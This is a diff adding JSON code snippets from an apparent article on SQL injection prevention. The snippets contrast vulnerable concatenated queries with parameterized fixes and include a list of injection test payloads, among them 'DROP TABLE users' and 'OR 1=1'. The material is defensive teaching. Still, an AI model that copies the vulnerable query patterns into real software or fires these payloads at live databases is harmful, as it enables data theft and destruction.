+    "code": "// VULNERABLE\r\nconst query = \"SELECT * FROM users WHERE user = '\" + username + \"' AND pass = '\" + password + \"'\";",
+    "articleId": "sql-injection-prevention",
+    "articleTitle": "SQL Injection (SQLi) Prevention",
+    "tags": [
+      "sql",
+      "database",
+      "injection",
+      "prisma",
+      "typeorm"
+    ]
+  },
+  {
+    "id": "sql-injection-prevention-1",
+    "title": "SQL Injection (SQLi) Prevention - Snippet 2",
+    "description": "Code example from SQL Injection (SQLi) Prevention",
+    "language": "javascript",
+    "code": "// SECURE\r\nconst text = 'SELECT * FROM users WHERE user = $1 AND pass = $2';\r\nconst values = [username, password];\r\nawait client.query(text, values);",
+    "articleId": "sql-injection-prevention",
+    "articleTitle": "SQL Injection (SQLi) Prevention",
+    "tags": [
+      "sql",
+      "database",
+      "injection",
+      "prisma",
+      "typeorm"
+    ]
+  },
+  {
+    "id": "sql-injection-prevention-2",
+    "title": "SQL Injection (SQLi) Prevention - Snippet 3",
+    "description": "Code example from SQL Injection (SQLi) Prevention",
+    "language": "java",
+    "code": "String query = \"SELECT * FROM users WHERE user = ? AND pass = ?\";\r\nPreparedStatement pstmt = connection.prepareStatement(query);\r\npstmt.setString(1, username);\r\npstmt.setString(2, password);\r\nResultSet results = pstmt.executeQuery();",
+    "articleId": "sql-injection-prevention",
+    "articleTitle": "SQL Injection (SQLi) Prevention",
+    "tags": [
+      "sql",
+      "database",
+      "injection",
+      "prisma",
+      "typeorm"
+    ]
+  },
+  {
+    "id": "sql-injection-prevention-3",
+    "title": "SQL Injection (SQLi) Prevention - Snippet 4",
+    "description": "Code example from SQL Injection (SQLi) Prevention",
+    "language": "typescript",
+    "code": "// SECURE BY DEFAULT\r\nconst user = await prisma.user.findFirst({\r\n  where: {\r\n    username: inputUsername, // Prisma automatically parameterizes this\r\n    password: inputPassword,\r\n  },\r\n});",
+    "articleId": "sql-injection-prevention",
+    "articleTitle": "SQL Injection (SQLi) Prevention",
+    "tags": [
+      "sql",
+      "database",
+      "injection",
+      "prisma",
+      "typeorm"
+    ]
+  },
+  {
+    "id": "sql-injection-prevention-4",
+    "title": "SQL Injection (SQLi) Prevention - Snippet 5",
+    "description": "Code example from SQL Injection (SQLi) Prevention",
+    "language": "typescript",
+    "code": "// SECURE\r\nconst user = await repository.findOneBy({ \r\n    username: inputUsername \r\n});\r\n\r\n// CAUTION: QueryBuilder can be vulnerable if misused\r\n// BAD\r\ncreateQueryBuilder(\"user\").where(\"user.name = '\" + name + \"'\");\r\n\r\n// GOOD (Using parameters)\r\ncreateQueryBuilder(\"user\").where(\"user.name = :name\", { name });",
+    "articleId": "sql-injection-prevention",
+    "articleTitle": "SQL Injection (SQLi) Prevention",
+    "tags": [
+      "sql",
+      "database",
+      "injection",
+      "prisma",
+      "typeorm"
+    ]
+  },
+  {
+    "id": "sql-injection-prevention-5",
+    "title": "SQL Injection (SQLi) Prevention - Snippet 6",
+    "description": "Code example from SQL Injection (SQLi) Prevention",
+    "language": "javascript",
+    "code": "// VULNERABLE: Malicious data stored, then used unsafely later\r\nconst userName = 'John\\'; DROP TABLE users; --';\r\nawait prisma.user.create({ data: { name: userName } });\r\n\r\n// Later, a report queries it unsafely:\r\nconst users = await db.query(\r\n  `SELECT * FROM users WHERE name = '${getUserFromDb()}'`\r\n);\r\n// Oops, the table is dropped!\r\n\r\n// FIX: Always parameterize\r\nconst user = await db.query(\r\n  `SELECT * FROM users WHERE name = ?`,\r\n  [getUserFromDb()]\r\n);",
+    "articleId": "sql-injection-prevention",
+    "articleTitle": "SQL Injection (SQLi) Prevention",
+    "tags": [
+      "sql",
+      "database",
+      "injection",
+      "prisma",
+      "typeorm"
+    ]
+  },
+  {
+    "id": "sql-injection-prevention-6",
+    "title": "SQL Injection (SQLi) Prevention - Snippet 7",
+    "description": "Code example from SQL Injection (SQLi) Prevention",
+    "language": "javascript",
+    "code": "// Test payloads to try during development\r\nconst sqlInjectionTests = [\r\n  \"' OR '1'='1\",\r\n  \"admin' --\",\r\n  \"' UNION SELECT NULL, NULL, NULL --\",\r\n  \"'; DROP TABLE users; --\"\r\n];\r\n\r\n// These should all fail safely (parameterization)\r\nsqlInjectionTests.forEach(async (payload) => {\r\n  try {\r\n    await prisma.user.findFirst({\r\n      where: { username: payload }\r\n    });\r\n    console.log(`✓ Safe against: ${payload}`);\r\n  } catch (err) {\r\n    console.error(`✗ Vulnerable to: ${payload}`, err);\r\n  }\r\n});",
+    "articleId": "sql-injection-prevention",
+    "articleTitle": "SQL Injection (SQLi) Prevention",
+    "tags": [
+      "sql",
+      "database",
+      "injection",
+      "prisma",
+      "typeorm"
+    ]
+  }
+]
